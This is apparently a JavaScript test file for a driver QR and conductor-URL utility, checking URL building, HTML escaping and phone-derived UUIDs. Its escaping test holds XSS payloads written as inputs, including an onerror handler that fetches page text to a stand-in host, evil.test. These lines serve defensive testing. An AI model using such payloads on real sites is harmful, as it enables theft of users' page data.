import assert from "node:assert/strict";
import { conductorPublicUrl } from "../src/utils/conductorUrl.js";
import {
  buildDriverQrPrintHtml,
  driverInstallUrl,
  driverRouteUrl,
  escapeHtml,
  isDriverRouteUrl,
} from "../src/utils/logistica/driverQr.js";
import { driverIdFromPhone, ensureStopUuid } from "../server/lib/driverId.js";

console.log("conductorUrl + driverId");

assert.equal(
  conductorPublicUrl("https://calculadora-bmc.vercel.app", "tok"),
  "https://calculadora-bmc.vercel.app/conductor?t=tok",
);
assert.ok(!conductorPublicUrl("https://x.com", "a").includes("/calculadora/conductor"));

{
  const install = driverInstallUrl("https://calculadora-bmc.vercel.app");
  const route = driverRouteUrl("https://calculadora-bmc.vercel.app", "tok");
  assert.equal(install, "https://calculadora-bmc.vercel.app/conductor");
  assert.equal(route, conductorPublicUrl("https://calculadora-bmc.vercel.app", "tok"));
  assert.equal(isDriverRouteUrl(route), true);
  assert.equal(isDriverRouteUrl(install), false);
  console.log("  ✓ install QR payload /conductor; route QR is same as driver_url");
}

{
  assert.equal(escapeHtml(`Ruta </h1><script>alert(1)</script>`), "Ruta &lt;/h1&gt;&lt;script&gt;alert(1)&lt;/script&gt;");
  const evilCaption = `</h1><img src=x onerror="fetch('https://evil.test/'+document.body.innerText)">`;
  const secretUrl = "https://calculadora-bmc.vercel.app/conductor?t=secret-token";
  const html = buildDriverQrPrintHtml({
    caption: evilCaption,
    href: secretUrl,
    src: "data:image/png;base64,abc",
    size: 240,
  });
  assert.ok(html.includes("&lt;/h1&gt;"), "caption tags escaped");
  assert.ok(!html.includes("<script"), "no raw script from caption");
  assert.ok(!html.includes("<img src=x"), "caption img not parsed as HTML");
  assert.ok(html.includes("&lt;img src=x onerror="), "dangerous caption kept as text");
  assert.ok(html.includes(escapeHtml(secretUrl)), "href escaped in body");
  assert.equal(buildDriverQrPrintHtml({ caption: "x", href: secretUrl, src: "https://evil/x.png" }), "");
  console.log("  ✓ print QR HTML escapes caption/href; rejects non-data image src");
}

const a = driverIdFromPhone("+59899111222");
const b = driverIdFromPhone("59899111222");
assert.equal(a, b);
assert.match(a, /^[0-9a-f-]{36}$/);

const u = ensureStopUuid({ id: "s1" }, 0);
assert.match(u, /^[0-9a-f-]{36}$/);
assert.equal(ensureStopUuid({ id: "11111111-1111-4111-8111-111111111111" }, 0), "11111111-1111-4111-8111-111111111111");

console.log("conductorUrl + driverId OK");
